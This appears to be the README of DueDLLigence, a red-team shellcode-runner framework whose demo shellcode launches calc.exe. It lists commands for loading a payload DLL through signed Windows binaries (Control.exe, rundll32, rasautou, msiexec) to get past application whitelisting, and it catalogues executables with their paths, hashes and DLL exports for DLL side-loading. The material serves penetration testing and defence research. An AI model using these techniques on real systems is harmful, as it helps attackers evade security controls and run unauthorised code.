# DueDLLigence

Shellcode runner framework for application whitelisting bypasses and DLL side-loading. The shellcode included in this project spawns calc.exe.

Authors: Evan Pena (@evan_pena2003), Ruben Boonen (@FuzzySec), Casey Erikson (@EriksocSecurity), Brett Hawkins (@h4wkst3r)

If desired, change the injection type by modifying the following line to the appropriate injection type
<br>```public const ExecutionMethod method = ExecutionMethod.CreateThread;```

Running the DLL with the following legitimate exes 

## Application Whitelisting Bypasses. Lolbins

### Control.exe
Export: CPlApplet
Syntax: Rename compiled “dll” extension to “cpl” and just double click it!
<br>```Control.exe [cplfile]```
<br>```Rundll32.exe Shell32.dll, Control_RunDLL [cplfile]```

### Rasautou
Export: powershell
<br>```rasautou –d {dllpayload} –p powershell –a a –e e```

### Msiexec
Export: DllUnregisterServer
<br>```msiexec /z {full path to msiexec.dll}```

## DLL Side-Loading Binaries and Details
### Tortoise SVN (SubWCRev.exe)
Executable: SubWCRev.exe
<br>File Path: C:\Program Files\Tortoise SVN\bin
<br>MD5 Hash: c422a95929dd627b4c2be52226287003
<br>DLL == "crshhndl.dll"; Arch == x64; OS == Win7 & 10;
<br>Exports: InitCrashHandler,SendReport,IsReadyToExit,SetCustomInfo,AddUserInfoToReport,RemoveUserInfoFromReport,AddFileToReport,RemoveFileFromReport,GetVersionFromApp,GetVersionFromFile

### Dism Image Servicing Utility (Dism.exe)
Executable: Dism.exe
<br>File Path: C:\Windows\System32
<br>MD5 Hash: 5e70ab0bf74bba785b83da53a3056a21
<br>DLL == "DismCore.dll"; Arch == x64; OS == Win7 & 10;
<br>Export: DllGetClassObject

### PotPlayerMini
Executable: PotPlayer.exe
<br>File Path: {Installation Directory}
<br>MD5 Hash: f16903b2ff82689404f7d0820f461e5d
<br>DLL == "PotPlayer.dll"; Arch == x86;
<br>Exports: PreprocessCmdLineExW,UninitPotPlayer,CreatePotPlayerExW,DestroyPotPlayer,SetPotPlayRegKeyW,RunPotPlayer

Credit for the DueDLLigence name goes to Paul Sanders (@saul_panders)
